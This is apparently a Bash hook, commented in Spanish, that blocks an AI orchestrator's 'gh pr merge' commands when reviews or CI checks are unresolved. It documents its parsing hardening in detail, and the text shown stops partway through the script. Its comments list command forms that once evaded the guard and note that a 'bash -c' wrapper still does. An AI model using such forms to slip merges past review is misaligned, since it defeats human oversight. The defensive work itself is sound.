#!/bin/bash
# Verifica que un PR no tenga threads de review sin resolver, reviews
# bloqueantes, ni CI checks fallando antes de permitir el merge.
#
# Endurecido 2026-08-11 tras el incidente de #821/#822:
#   1. FAIL-CLOSED: si una llamada a gh falla (rate limit, red), el hook
#      BLOQUEA explicando que no pudo verificar — antes fallaba abierto en
#      silencio, y por eso #821 se mergeó sin que el guard actuara.
#   2. PRECISIÓN: solo bloquean los threads de review SIN RESOLVER (inline,
#      via GraphQL isResolved). Los comentarios generales del PR no tienen
#      estado de resolución y son conversación legítima (resúmenes de ronda,
#      contexto) — contarlos todos obligaba a borrarlos para poder mergear.
#
# Endurecido 2026-08-13 (matching quirúrgico + CI sin checks configurados):
#   3. MATCHING: el gate ya no hace grep sobre el string crudo del comando.
#      Antes, un git commit con un heredoc que mencionaba la frase de merge
#      en su mensaje disparaba el gate como si fuera una invocación real
#      (falso positivo bloqueante), y si esa mención traía un número, el
#      guard terminaba validando un PR sin relación con el comando real
#      (falso positivo con blast radius). En sentido contrario, un merge
#      real dentro de un comando compuesto (cmd && gh pr merge N) pasaba
#      sin validar porque el gate solo miraba el inicio del string completo
#      (falso negativo). Ahora se sanean spans quoted ('...' y "...") y
#      cuerpos de heredoc antes de matchear, y el match se ancla a posición
#      de comando (inicio de string/línea, o justo después de &&, ||, ;, |,
#      $(). Limitación aceptada: es saneo heurístico de texto, no un parser
#      de shell real — un wrapper como bash -c "..." no se detecta porque
#      el comando real queda dentro de una string que este hook sanitiza.
#      Aceptable: el hook protege errores honestos del orchestrator, no
#      evasión adversarial. El saneo + ancla vive en hooks/lib/guard-
#      matching.sh — compartido con block-admin-merge.sh y pre-commit-
#      guard.sh, que tenían el mismo matching frágil (#47).
#   4. CI SIN CHECKS CONFIGURADOS: en un repo sin ningún check (gh pr checks
#      no reporta nada para esa PR), el guard bloqueaba con el mismo mensaje
#      que usa para un fallo real de la consulta. "Sin checks" es un pass
#      legítimo (0 fallando, 0 pendientes); ahora se distingue por el texto
#      que gh manda a stderr ("no checks reported"), el único indicador
#      disponible — no hay una salida --json para este caso. Limitación
#      aceptada: si gh cambia ese texto en una versión futura, este caso
#      vuelve a fail-closed (bloquea) en vez de pasar — es el fallback
#      seguro.
#
# Endurecido 2026-08-13 (fail-closed sin dependencias, #50):
#   5. Todo lo anterior depende de perl (saneo del comando), jq (parseo del
#      JSON de entrada y de las respuestas de gh) y grep (el gate del saneo
#      degradado y el camino dominante que decide "esto es una invocación
#      real"). Antes, si faltaba cualquiera de los dos primeros, la
#      sustitución/parseo devolvía vacío, el grep no matcheaba, y el hook
#      emitía {"continue":true} en silencio: cualquier gh pr merge pasaba
#      sin verificar — justo lo contrario del diseño fail-closed que este
#      header declara. grep se sumó al check en la retro del PR #60: sin
#      él, "command not found" hace que el `if !` de las líneas de match
#      de abajo se evalúe como éxito, con el mismo resultado de fail-open.
#      Ahora los tres se verifican al inicio, antes de leer stdin, y se
#      bloquea sin depender de jq (la propia herramienta que puede faltar).
if ! command -v perl > /dev/null 2>&1 || ! command -v jq > /dev/null 2>&1 || ! command -v grep > /dev/null 2>&1; then
  printf '{"decision":"block","reason":"pre-merge-check no operativo: falta perl, jq o grep"}\n'
  exit 0
fi

# Endurecido 2026-09-16 (repo resuelto por el comando, no por el cwd de la
# sesión, PR #75):
#   6. Sin --repo explícito, el guard SIEMPRE resolvía el repo con
#      `gh repo view` corriendo en el cwd de la SESIÓN. Un `cd <ruta> &&
#      gh pr merge N` — el patrón que este mismo repo recomienda para
#      trabajar cross-repo, porque el cd de un comando de Bash no persiste
#      entre invocaciones — nunca lo tocaba: este hook corre en la raíz de
#      la sesión, no en el cwd del comando interceptado. Incidente real:
#      un `cd claude-methodology && gh pr merge 75` lanzado con la sesión
#      parada en easy-quotes resolvió easy-quotes#75 (un PR homónimo,
#      mergeado en julio, con su check de CI en rojo) y bloqueó con un
#      motivo que no aplicaba al PR real. La salida usada fue --repo
#      explícito, que ya funcionaba bien — pero documentar la limitación
#      y quedarse ahí entrena a pedir --repo de memoria en vez de arreglar
#      la causa (decisión del usuario, ver D-01 en `.planning/` de ese
#      PR). Ahora se detecta un cd INICIAL (la primera palabra del
#      comando completo) y se resuelve `gh repo view` corriendo en ESE
#      directorio, no en el cwd de la sesión — ver el bloque bajo
#      "Detectar owner/repo" más abajo. Deliberadamente acotado al cd
#      inicial, no a cualquier cd en cualquier posición: es el patrón real
#      del incidente y el que este repo recomienda; un parser de shell
#      completo sigue fuera de alcance (mismo criterio que el resto de
#      este archivo).
#
# Endurecido 2026-09-16, ronda 2 (allowlist de la forma completa, no solo
# del "cd" inicial, follow-up del review pre-push de lo anterior):
#   7. La detección del punto 6 validaba caracteres de la ruta pero no la
#      FORMA del comando: `cd X | gh pr merge`, `cd X & gh pr merge`,
#      `cd X extra; gh pr merge` (zsh), `cd /r/pfx"-real" && …` (la
#      comilla no abre la ruta, cae a mitad — guard_sanitize la colapsa a
#      un espacio y el guard verificaba /r/pfx mientras el shell real
#      hacía cd a /r/pfx-real), una continuación con backslash con el
#      mismo problema, `cd`↵`/r/real` (el regex saltaba el salto de línea
#      como si fuera el espacio que separa comando de argumento),
#      `pushd`/`builtin cd`/`\cd`/`eval cd`/`chdir`/`command cd` (ninguno
#      arranca con la palabra "cd", así que el punto 6 los ignoraba
#      completo), `cd old new` (zsh, dos argumentos), `(cd X && …)`,
#      `true && cd X && …`, `{ cd X && …; }` y `cd&&gh pr merge` (sin
#      espacio) hacían que el guard verificara un repo y `gh` mergeara
#      otro, o que un cd en posición ambigua cayera sin aviso al cwd de
#      la sesión. Ahora la ÚNICA forma aceptada antes de la invocación de
#      merge, sin --repo explícito, es (a) nada — se resuelve con el cwd
#      de la sesión, igual que en el punto 6 — o (b) exactamente
#      "cd <ruta absoluta> && " y nada más en la misma línea, con la ruta
#      idéntica en el comando crudo y en el saneado. `;`, `|`, `&` sueltos
#      y el salto de línea NO son separadores válidos acá aunque sí lo son
#      para el resto del archivo: si el cd falla en tiempo de ejecución,
#      esos separadores dejan que el merge corra igual, en la sesión —
#      con "&&" el shell nunca llega al merge si el cd falló. Cualquier
#      otra cosa (incluido un cd/pushd/builtin/etc. que NO arranca el
#      comando) bloquea pidiendo --repo explícito — allowlist de la forma,
#      no blocklist de construcciones: no se enumera qué envoltorios están
#      prohibidos, se exige que el prefijo sea exactamente uno de los dos
#      permitidos. Ver el bloque bajo "Detectar owner/repo" para el
#      detalle de cada chequeo.
#   8. Formas de `gh pr merge` que el punto 3 no anclaba: `gh -R x pr merge
#      N` y `gh pr -R x merge N` (y lo mismo con `--repo`/`--repo=`) son
#      formas válidas de gh (-R es flag persistente de `gh pr`, no de
#      `merge` — verificado contra gh real) que no matcheaban el ancla
#      "gh\s+pr\s+merge" y pasaban con {"continue":true} sin verificar
#      nada. Ahora la ancla tolera hasta 2 tokens entre "gh"/"pr" y entre
#      "pr"/"merge" (ver GH_PR_MERGE_RE más abajo). Además, `GH_REPO` en
#      el comando o en el entorno del hook bloquea siempre (gh pr lo usa,
#      gh repo view no — verificado contra gh real), y más de una
#      invocación real de `gh pr merge` en el mismo comando bloquea en vez
#      de validar solo la primera.

INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

# Resolución del path del lib sin depender de un binario externo (dirname):
# "${0%/*}" es el idioma de shell para dirname cuando $0 trae al menos un
# "/" — siempre el caso dado cómo el harness invoca los hooks. Ver #50: la
# misma razón por la que el check de perl/jq de arriba no puede fallar
# abierto, un `source` de un path que dirname no pudo resolver tampoco.
LIB="${0%/*}/lib/guard-matching.sh"
if [ ! -r "$LIB" ]; then
  printf '{"decision":"block","reason":"pre-merge-check no operativo: falta hooks/lib/guard-matching.sh"}\n'
  exit 0
fi
# shellcheck source=lib/guard-matching.sh
source "$LIB"

SANITIZED_COMMAND=$(guard_sanitize "$COMMAND")
SANITIZE_STATUS=$?

# "perl falló en tiempo de ejecución" y "perl ausente" (chequeado arriba,
# antes de leer stdin) son el mismo estado para este guard: bloquea. Los
# otros dos guards que sanean (block-admin-merge.sh, pre-commit-guard.sh)
# toleran el fallback de guard_sanitize (comando sin sanear) porque solo
# BLOQUEAN de más sobre texto crudo — la dirección segura. Este guard es
# distinto: EXTRAE el número de PR del texto (abajo) para decidir A CUÁL
# PR validar, y esa extracción no está anclada con GUARD_ANCHOR como el
# check de "es una invocación real" — sobre texto sin sanear, un señuelo
# quoted con número (ej. un mensaje de commit que menciona "gh pr merge 7")
# le gana la extracción a la invocación real y el guard termina
# verificando el PR equivocado en vez de bloquear por "sin número
# explícito", que es lo que correspondería. Ver guard_sanitize() en
# hooks/lib/guard-matching.sh para el contrato de exit status. El status
# se captura en SANITIZE_STATUS en la línea de arriba, inmediatamente
# después de la asignación — no como un "$?" leído más abajo, que un
# comando insertado entre medio podría pisar en silencio.
#
# Gate permisivo sobre el texto CRUDO (no el saneado, que no es confiable
# acá) antes de bloquear: este guard corre sobre TODAS las llamadas Bash
# del harness, no solo sobre merges. Sin este gate, un saneo fallido
# bloqueaba cualquier comando — "ls -la", "cat README.md", "git status" —
# con un mensaje sobre extracción de números de PR que para esos comandos
# no significa nada (security, verificado empíricamente). Y es alcanzable
# sin trampas: el regex de heredocs sigue siendo ~O(n²) en aperturas
# "<<palabra" sin terminador — un comando legítimo lo bastante grande
# agota el alarm(5) él solo. Si el texto ni siquiera menciona gh/pr/merge
# no puede ser una invocación real de "gh pr merge" — no bloquea. Si SÍ
# los menciona, no se puede confiar en la extracción sobre texto sin
# sanear — bloquea igual que antes. Nota de security: este gate sobre
# crudo pierde invocaciones partidas con continuación de línea, pero esa
# limitación ya existe hoy en el camino de fallback de abajo (el check de
# "es una invocación real", más adelante en este archivo), así que acotar
# no empeora nada.
if [ "$SANITIZE_STATUS" -ne 0 ]; then
  if echo "$COMMAND" | grep -qi 'gh' && echo "$COMMAND" | grep -qi 'pr' && echo "$COMMAND" | grep -qi 'merge'; then
    printf '{"decision":"block","reason":"pre-merge-check no operativo: el saneo del comando falló (perl abortó en tiempo de ejecución) — no se puede confiar en la extracción del número de PR sobre texto sin sanear"}\n'
    exit 0
  fi
  echo '{"continue":true}'
  exit 0
fi

# [security, ronda 2 del follow-up de PR #75] gh acepta -R/--repo/--repo=
# ENTRE "gh" y "pr", o entre "pr" y "merge" (son flags persistentes de `gh
# pr`, no de `merge` — cobra las acepta en cualquier posición desde "pr" en
# adelante; verificado contra gh real: `gh -R o/r pr view N`, `gh pr -R o/r
# view N` y `gh pr view N -R o/r` resuelven los tres). Sin esto, "gh -R x pr
# merge N" y "gh pr -R x merge N" no matcheaban esta ancla (exige "pr"/
# "merge" pegados) y pasaban con {"continue":true} sin verificar nada. El
# hueco de en medio tolera hasta 2 tokens (cubre la forma con espacio, "-R
# valor", y la pegada/con "=", "-Rvalor"/"--repo=valor", como un solo
# token) — SOLO para decidir "esto es una invocación real", no para
# extraer el valor (eso lo sigue haciendo el loop de --repo/-R más abajo,
# que ahora ve esos tokens porque la ventana arranca en "gh", no en
# "merge").
GH_PR_MERGE_RE='gh\s+(\S+\s+){0,2}pr\s+(\S+\s+){0,2}merge'

# [security, ronda 2 del follow-up de PR #75] "GH_REPO=valor gh pr merge N"
# es una invocación real (el prefijo de asignación de variable de entorno
# es sintaxis de shell normal, no texto inerte) pero GUARD_ANCHOR no lo
# reconoce como posición de comando — ninguna de sus alternativas modela
# "después de un VAR=valor al inicio de un comando", así que sin esto el
# gate de abajo respondía {"continue":true} antes incluso de llegar al
# chequeo de GH_REPO más abajo. Acotado a GH_REPO específicamente (no
# cualquier VAR=valor) porque es lo único que este fix necesita resolver.
GH_REPO_PREFIX_RE='(GH_REPO=\S*\s+)?'

# Solo interceptar invocaciones reales de gh pr merge
if ! echo "$SANITIZED_COMMAND" | grep -qE "${GUARD_ANCHOR}${GH_REPO_PREFIX_RE}${GH_PR_MERGE_RE}\b"; then
  echo '{"continue":true}'
  exit 0
fi

block() {
  local reason="$1"
  echo "{\"decision\":\"block\",\"reason\":$(printf '%s' "$reason" | jq -Rs .)}"
  exit 0
}

# [security, ronda 2 del follow-up de PR #75] GH_REPO: los subcomandos
# "gh pr" (incluido "merge") lo usan como repo por defecto si no hay
# -R/--repo; "gh repo view" —de donde este guard resuelve el repo cuando no
# hay --repo ni cd inicial— NO lo usa (verificado contra gh real: con
# GH_REPO seteado y el cwd sin remote, "gh repo view" sigue fallando "not a
# git repository", mientras "gh pr view" con el mismo GH_REPO resuelve
# igual). Si GH_REPO aparece en el comando interceptado (prefijo, export,
# o cualquier otra mención — no se intenta distinguir "es una asignación
# real" de "es solo texto", la misma razón por la que este guard no confía
# en texto sin anclar en ningún otro lado) o está seteado en el entorno del
# propio proceso del hook, el repo que "gh repo view" resolvería puede no
# ser el que "gh pr merge" usaría de verdad. No se asume que un --repo
# explícito en el comando le gana a GH_REPO sin verificarlo — bloquea
# también en ese caso.
if echo "$COMMAND" | grep -q 'GH_REPO' || [ -n "${GH_REPO:-}" ]; then
  block "Blocked: el comando o el entorno tienen GH_REPO seteado — gh repo view no lo respeta pero gh pr merge sí, así que este guard no puede confiar en su propia resolución del repo. Quita GH_REPO del comando/entorno y usa --repo explícito."
fi

# [security, ronda 3] Ventana de la invocación anclada, consciente de
# balance. La ronda 2 cortaba la ventana en el primer ";", "|", "&", ")",
# "}" o backtick que aparecía — sin distinguir un separador de comando real
# de un delimitador de expansión que ABRE adentro de la propia ventana:
# "gh pr merge 45 --match-head-commit $(git rev-parse HEAD) --repo real/repo"
# cortaba en el ")" que cierra el $(...), perdiendo el --repo real que
# viene después — el guard caía al repo del cwd sin verificar nada
# (fail-open real, reproducido con gh falso: mismo patrón que el HIGH #1
# de la ronda anterior, esta vez introducido por el propio fix). Pasaba
# igual con "${VAR}" y con backticks que abren a mitad de la ventana
# (--subject `date`).
#
# Fix: en vez de una clase de caracteres plana, se tokeniza la ventana
# llevando la cuenta de paréntesis y llaves abiertas DENTRO de la ventana
# (sin contar el "(", "{" o backtick que pudo haber abierto el GUARD_ANCHOR,
# que arranca en cero porque el conteo empieza justo en "gh", no antes) y
# de si hay un backtick pendiente. Un ")"/"}"/backtick con el contador
# correspondiente en cero es lo único que corta la ventana — cierra algo
# que se abrió ANTES de este comando (el propio anchor, o un grupo/
# subshell que ya envolvía todo desde afuera), nunca algo que se abrió
# adentro. Mismo criterio para ";"/"|"/"&": solo cortan si ningún
# paréntesis/llave/backtick sigue abierto — un separador real DENTRO de
# un $(cmd1; cmd2) no es un separador para ESTE comando.
#
# Implementado en perl (no en un loop de bash carácter por carácter): un
# loop de bash con "${s:$i:1}" sobre un solo carácter a la vez resultó
# CUADRÁTICO en este intérprete — 100 KB ya no terminaba en 2 minutos.
# perl con \G/pos() en modo scalar consume corridas enteras de texto
# "aburrido" en una sola operación de regex (compilada, sin el overhead
# de iterar carácter por carácter a nivel de intérprete): medido, 1 MB
# en 0.05s, 20 MB en 0.95s — lineal, no cuadrático (y sin backtracking
# ambiguo: cada alternativa del regex consume un conjunto de caracteres
# disjunto del resto, igual razonamiento de guard_sanitize). alarm(5)
# como red de seguridad ante cualquier patológico no anticipado, igual
# que en guard_sanitize — si perl no vuelve a tiempo (o falla por
# cualquier otro motivo), NO se puede confiar en una ventana parcial o
# vacía: bloquea en vez de adivinar cuál mitad del comando es la real.
ANCHORED_TO_END=$(echo "$SANITIZED_COMMAND" | grep -oE "${GUARD_ANCHOR}${GH_PR_MERGE_RE}"'\b.*' | head -1)
# Recorta el prefijo del anchor (separador, o el "(", "{" o backtick que
# lo empieza) buscando "gh...pr...merge" DENTRO del texto ya anclado —
# seguro porque ANCHORED_TO_END ya está acotado a partir del match real, no
# vuelve a buscar sobre el comando completo. La ventana arranca en "gh"
# (no en "merge") a propósito: así el loop de --repo/-R de más abajo ve
# también un -R/--repo que haya quedado entre "gh" y "pr" o entre "pr" y
# "merge" (ver GH_PR_MERGE_RE).
MERGE_WINDOW_FULL=$(echo "$ANCHORED_TO_END" | grep -oE "${GH_PR_MERGE_RE}"'\b.*' | head -1)
# Si lo que abrió el anchor fue justo un backtick, el contador de
# paréntesis/llaves no alcanza para reconocerlo (backtick usa el MISMO
# carácter para abrir y cerrar) — se pasa aparte para que el primer
# backtick que aparezca escaneando se trate como su cierre, no como la
# apertura de uno nuevo.
ANCHOR_STARTS_BACKTICK=false
[ "${ANCHORED_TO_END:0:1}" = '`' ] && ANCHOR_STARTS_BACKTICK=true

# [security, ronda 4] El contador cortaba SOLO al llegar a un cierre con
# profundidad cero — nunca miraba su propio estado al llegar a fin de
# ventana. Un abridor que sobrevive a guard_sanitize sin su cierre (un
# "\(" escapado, o una llave suelta como "a{b" — ninguno de los dos es
# heredoc, quoted span ni continuación, así que guard_sanitize los deja
# intactos) dejaba paren_depth/brace_depth en >0 para SIEMPRE: ";"/"|"/"&"
# dejaban de cortar (exigen los tres contadores en cero) y la ventana se
# comía la invocación siguiente completa — con "gana la última" del
# tokenizer de --repo, el --repo del vecino le ganaba al real. Fix: al
# salir del while (por "last" o por agotar el string), si algún contador
# quedó > 0 o el backtick sigue abierto, la ventana no tiene límites
# determinables — sale con status != 0 y el caller bloquea (mismo camino
# que ya existía para el timeout de alarm(5)). Una ventana indeterminada
# no es una ventana: no se adivina ni de más ni de menos.
#
# [security, ronda 5] El chequeo de arriba no cubre un cierre o separador
# ESCAPADO ("\)", "\}", "\;", "\|", "\&" — sobreviven igual a
# guard_sanitize, que no toca backslashes) en profundidad cero: el
# contador nunca pasa de cero, así que nada queda "desbalanceado" para el
# chequeo anterior, pero la ventana corta ahí igual, silenciosa, antes
# del --repo real. Tres direcciones de la misma raíz (cortar de más,
# cortar de menos, cerrar escapado) por intentar adivinar el límite sobre
# texto que ya perdió estructura en el saneo — en vez de una cuarta
# regla que adivine mejor y destape un cuarto espejo, decisión del
# usuario: cualquier backslash que llegue al tokenizer dentro de la
# ventana consumida (los ocho caracteres de arriba no cambian, no hay
# estado nuevo) hace la ventana indeterminada. Un backslash DENTRO de un
# span quoted no llega nunca acá — guard_sanitize ya lo colapsó a un
# espacio antes de esta etapa.
#
# [security, ronda 5] Dependencia no obvia de la que depende que esta
# regla del backslash sea viable sin bloquear la forma más común de
# este flujo: guard_sanitize une las continuaciones de línea
# (s/\\\n\s*/ /g en hooks/lib/guard-matching.sh:97, la regla de "join"
# que corre ANTES que la de heredocs y la de quotes) reemplazando cada
# backslash-seguido-de-salto-de-línea por un espacio — así que un
# "gh pr merge 45 <barra invertida al final>" con el resto en la línea
# siguiente llega a SANITIZED_COMMAND, y por lo tanto a
# MERGE_WINDOW_FULL, ya sin backslash y sin salto de línea, unido en una
# sola línea. Si esa unión no corriera antes de esta etapa
# (guard_sanitize deshabilitado, o un refactor futuro que cambie el
# orden de sus reglas o mueva este chequeo antes del saneo), el
# backslash de CADA línea continuada llegaría intacto al tokenizer y el
# chequeo de arriba bloquearía TODO merge multilínea — el over-block más
# común posible en este flujo, no un caso de borde. Verificado contra 22
# formas reales de merge (incluida la continuación a 3 líneas): pasan
# hoy porque esta unión ya ocurrió antes de llegar acá.
MERGE_WINDOW=$(printf '%s' "$MERGE_WINDOW_FULL" | perl -0777 -e '
BEGIN { alarm 5 }
my $anchor_backtick = $ARGV[0];
my $s = <STDIN>;
my $paren_depth = 0;
my $brace_depth = 0;
my $backtick_state = ($anchor_backtick eq "true") ? "outer" : "none";
my $stop_pos = length($s);
while ($s =~ /\G(\$\(|\$\{|[(){}`;|&]|[^(){}`;|&]+)/gc) {
  my $tok = $1;
  if ($tok eq "\$(" || $tok eq "(") {
    $paren_depth++;
  } elsif ($tok eq "\${" || $tok eq "{") {
    $brace_depth++;
  } elsif ($tok eq ")") {
    if ($paren_depth > 0) { $paren_depth--; }
    else { $stop_pos = pos($s) - length($tok); last; }
  } elsif ($tok eq "}") {
    if ($brace_depth > 0) { $brace_depth--; }
    else { $stop_pos = pos($s) - length($tok); last; }
  } elsif ($tok eq "`") {
    if ($backtick_state eq "outer") { $backtick_state = "none"; $stop_pos = pos($s) - length($tok); last; }
    elsif ($backtick_state eq "mid") { $backtick_state = "none"; }
    else { $backtick_state = "mid"; }
  } elsif ($tok eq ";" || $tok eq "|" || $tok eq "&") {
    if ($paren_depth == 0 && $brace_depth == 0 && $backtick_state eq "none") {
      $stop_pos = pos($s) - length($tok);
      last;
    }
  }
}
if ($paren_depth != 0 || $brace_depth != 0 || $backtick_state ne "none") {
  exit 1;
}
if (substr($s, 0, $stop_pos) =~ /\\/) {
  exit 1;
}
print substr($s, 0, $stop_pos);
' "$ANCHOR_STARTS_BACKTICK")
MERGE_WINDOW_STATUS=$?
if [ "$MERGE_WINDOW_STATUS" -ne 0 ]; then
  block "Blocked: no pude determinar los límites de la invocación real de gh pr merge (el cálculo de la ventana falló, superó el tiempo límite, quedó indeterminada por un paréntesis/llave/backtick sin cerrar, o encontró un backslash) — el guard no verifica a ciegas."
fi

# [security, ronda 2 del follow-up de PR #75] Más de una invocación real de
# gh pr merge en el mismo comando: MERGE_WINDOW solo cubre la PRIMERA
# (acotada arriba por el primer separador en profundidad cero) — el texto
# que queda DESPUÉS de esa ventana, dentro de lo que ya sabíamos anclado
# (ANCHORED_TO_END), puede tener una segunda invocación completa que este
# guard nunca validaría ("gh pr merge 1 --repo a/b || gh pr merge 45
# --repo real/repo" verificaba solo la de la izquierda). No hay forma de
# saber cuál de las dos ejecuta gh de verdad sin ejecutar el comando —
# bloquea en vez de adivinar.
REMAINING_AFTER_WINDOW="${MERGE_WINDOW_FULL:${#MERGE_WINDOW}}"
if echo "$REMAINING_AFTER_WINDOW" | grep -qE "${GUARD_ANCHOR}${GH_PR_MERGE_RE}\b"; then
  block "Blocked: el comando trae más de una invocación de gh pr merge — el guard solo puede verificar una a la vez. Usa un comando por invocación, con --repo explícito si hace falta."
fi

# PR_NUMBER se extrae de la MISMA ventana que --repo (antes salía del
# comando completo, sin anclar y sin head -1) para que ambos salgan
# siempre de la misma invocación. head -1 al final por determinismo: si
# igual apareciera más de un match dentro de la ventana (no debería, dado
# el balance de arriba), se toma el primero de forma explícita en vez de
# dejar que la asignación de PR_NUMBER termine multilínea. El patrón
# tolera hasta 2 tokens entre "gh"/"pr"/"merge" (mismo GH_PR_MERGE_RE de
# la detección) para que un -R/--repo intercalado no rompa la extracción
# del número.
PR_NUMBER=$(echo "$MERGE_WINDOW" | grep -oE "${GH_PR_MERGE_RE}"'\s+([0-9]+)' | head -1 | grep -oE '[0-9]+$')

if [ -z "$PR_NUMBER" ]; then
  # Sin número explícito no podemos verificar el PR correcto → fail-closed.
  # Nota: "gh pr merge --repo o/r 45" (flag antes del número) es forma
  # válida de gh y cae acá — fail-closed, no es un hueco, solo una
  # invocación válida que el guard no resuelve. No se generaliza la
  # extracción a "cualquier token numérico de la ventana" para no ampliar
  # el scope de este fix; ver reporte del PR para la nota completa.
  echo '{"decision":"block","reason":"Blocked: gh pr merge sin número de PR explícito — el guard no puede verificar el PR implícito del branch. Usa gh pr merge <numero>."}'
  exit 0
fi

# --repo <owner>/<name> (o --repo=<owner>/<name>, -R <owner>/<name>,
# -R<owner>/<name> pegado sin espacio, o -R=<owner>/<name> — las formas
# que gh realmente acepta, verificado contra `gh help pr merge` y contra
# GitHub real) explícito en el comando interceptado: gana sobre el repo
# del cwd de la sesión. Antes, el guard detectaba el repo SIEMPRE con
# `gh repo view` sobre el cwd — un `gh pr merge <N> --repo otro/repo`
# real quedaba bloqueado fail-closed porque `gh pr view` corría contra el
# repo local, donde ese PR no existe (no hay "cd" posible al cwd del
# comando interceptado: este hook corre en la raíz de la sesión). Se
# busca dentro de MERGE_WINDOW (calculada arriba, anclada y consciente de
# balance) — no en el comando completo.
#
# gh no trata --repo como "una flag, un token": acepta -R en tres formas
# (con espacio, pegado "-Rvalor", con "=") y, si se repite, gana la
# ÚLTIMA ocurrencia (verificado contra GitHub real con --repo duplicado y
# con --repo/-R mezclados). Un regex de un solo shot no modela esto con
# confianza — se tokeniza la ventana (misma noción de "palabras
# separadas por espacio" que ve gh en argv, ya que guard_sanitize corrió
# antes) y se recorre de izquierda a derecha pisando el valor cada vez
# que aparece la flag, para que gane la última igual que en gh real.
#
# [security, ronda 3, LOW] "Gana la última" asume que TODO lo que quedó
# dentro de MERGE_WINDOW es confiable por igual, incluida la cola: un
# decoy después del --repo real pero antes de cualquier separador real
# también gana, por ejemplo un comentario en la misma línea
# ("gh pr merge 45 --repo real/repo # ojo con --repo evil/x" usa
# evil/x) — guard_sanitize no sabe de comentarios "#" de shell, así que
# ese texto no se distingue de una flag real. Fidelidad correcta a gh
# (así prioriza gh de verdad) pero vale dejarlo escrito: NO es "se
# ignora lo sospechoso", es "gana lo último, punto", y ese supuesto
# depende de que nada dentro de la ventana sea contenido inerte que
# guard_sanitize no supo reconocer.
#
# Un valor entre comillas queda destruido por guard_sanitize (colapsa el
# span quoted a un solo espacio) ANTES de que esta extracción corra —
# comillar el argumento es una forma normal de escribir el comando, no
# evasión, así que no se puede ignorar sin más. Si la flag aparece pero no
# queda un token utilizable después (vacío, o el siguiente token es otra
# flag que empieza con "-"), NO se adivina el repo del cwd: se bloquea más
# abajo. Esto también evita culpar a la flag equivocada: en
# "--repo 'a/b' --squash", el único token que sobrevive al saneo después
# de --repo es "--squash" — se descarta por empezar con "-" (no se toma
# como valor), en vez de terminar bloqueando con un mensaje que responsabiliza
# a --squash de una forma inválida que no es suya.
REPO_FLAG_SEEN=false
REPO_FLAG_VALUE=""
read -ra MERGE_WINDOW_TOKENS <<< "$MERGE_WINDOW"
TOKEN_IDX=0
TOKEN_COUNT=${#MERGE_WINDOW_TOKENS[@]}
while [ "$TOKEN_IDX" -lt "$TOKEN_COUNT" ]; do
  TOKEN="${MERGE_WINDOW_TOKENS[$TOKEN_IDX]}"
  case "$TOKEN" in
    --repo=*)
      REPO_FLAG_SEEN=true
      REPO_FLAG_VALUE="${TOKEN#--repo=}"
      ;;
    --repo|-R)
      REPO_FLAG_SEEN=true
      NEXT_IDX=$((TOKEN_IDX + 1))
      if [ "$NEXT_IDX" -lt "$TOKEN_COUNT" ] && [ -n "${MERGE_WINDOW_TOKENS[$NEXT_IDX]}" ] \
        && [[ "${MERGE_WINDOW_TOKENS[$NEXT_IDX]}" != -* ]]; then
        REPO_FLAG_VALUE="${MERGE_WINDOW_TOKENS[$NEXT_IDX]}"
        TOKEN_IDX=$NEXT_IDX
      else
        REPO_FLAG_VALUE=""
      fi
      ;;
    -R=*)
      REPO_FLAG_SEEN=true
      REPO_FLAG_VALUE="${TOKEN#-R=}"
      ;;
    -R?*)
      REPO_FLAG_SEEN=true
      REPO_FLAG_VALUE="${TOKEN#-R}"
      ;;
  esac
  TOKEN_IDX=$((TOKEN_IDX + 1))
done

EXPLICIT_REPO=""
if [ "$REPO_FLAG_SEEN" = true ]; then
  # Forma validada: "owner/name" (dos segmentos, sin "/" adicional en
  # ninguno de los dos gracias a la clase de caracteres). Esto rechaza a
  # propósito la forma de tres segmentos "[HOST/]OWNER/REPO" que gh
  # documenta para GitHub Enterprise — fail-closed (bloquea en vez de
  # adivinar cuál segmento es el host), no una vulnerabilidad, pero
  # que no sorprenda al próximo: un --repo apuntando a un host Enterprise
  # real bloquea igual que uno malformado.
  if echo "$REPO_FLAG_VALUE" | grep -qE '^[A-Za-z0-9][A-Za-z0-9._-]*/[A-Za-z0-9._-]+$'; then
    EXPLICIT_REPO="$REPO_FLAG_VALUE"
  else
    # [security LOW] El valor reflejado en el mensaje se trunca: viene del
    # comando (un token sin cota de tamaño), y jq -Rs escapa bien pero no
    # acota longitud — sin esto, un token de cientos de KB vuelve entero
    # al usuario en el reason.
    REPO_VALUE_FOR_REASON="$REPO_FLAG_VALUE"
    if [ "${#REPO_VALUE_FOR_REASON}" -gt 64 ]; then
      REPO_VALUE_FOR_REASON="${REPO_VALUE_FOR_REASON:0:64}..."
    fi
    block "Blocked: --repo/-R sin un valor owner/name utilizable ('${REPO_VALUE_FOR_REASON}') — puede ser una comilla saneada (guard_sanitize colapsa comillas a un espacio) o una forma inválida/incompleta. El guard no puede verificar un repo sin confirmar cuál es."
  fi
fi

# [security, follow-up PR #75, ronda 1 y 2] Detección de un cd INICIAL
# antes del merge, para resolver el repo en ESE directorio en vez del cwd
# de la sesión — ver el punto 6 del header. La ronda 1 solo miraba SI el
# comando arrancaba con "cd"; esta ronda además exige que la FORMA
# completa que antecede al merge sea exactamente "cd <ruta absoluta> && "
# — nada más. Es una ALLOWLIST de la forma, no una blocklist de
# construcciones: en vez de enumerar qué separadores/envoltorios están
# prohibidos (pipe, punto y coma, subshell, pushd, builtin cd, ...), se
# exige que el único texto entre el inicio del comando y "gh pr merge" sea
# o bien nada, o bien exactamente esa forma — cualquier otra cosa bloquea.
#
# CD_STARTS_REGEX solo confirma que el comando ARRANCA con un "cd" como
# palabra propia (no "cdc-tool" ni similar) — incluye "cd" pegado a un
# operador de control sin espacio ("cd&&...", "cd;...") para que ese caso
# entre a esta rama (y termine bloqueado por "sin ruta clara" más abajo)
# en vez de caer sin aviso al fallback de la sesión.
# CD_TARGET_REGEX intenta extraer un único token limpio como destino — usa
# [ \t] (no [[:space:]]) entre "cd" y el destino para que un salto de
# línea ahí NO cuente como el espacio que separa comando de argumento: sin
# esto, "cd"↵"/r/real"↵"gh pr merge 5" extraía "/r/real" como si fuera el
# argumento del cd, cuando en el shell real esa es una línea (una
# invocación) aparte y el cd corre sin argumento (va a $HOME).
CD_STARTS_REGEX='^[[:space:]]*cd([[:space:]]|[&;|]|$)'
CD_TARGET_REGEX='^[[:space:]]*cd[ \t]+([^[:space:]&;|]+)'
LEADING_CD_SEEN=false
LEADING_CD_TARGET=""
LEADING_CD_AMBIGUOUS=false
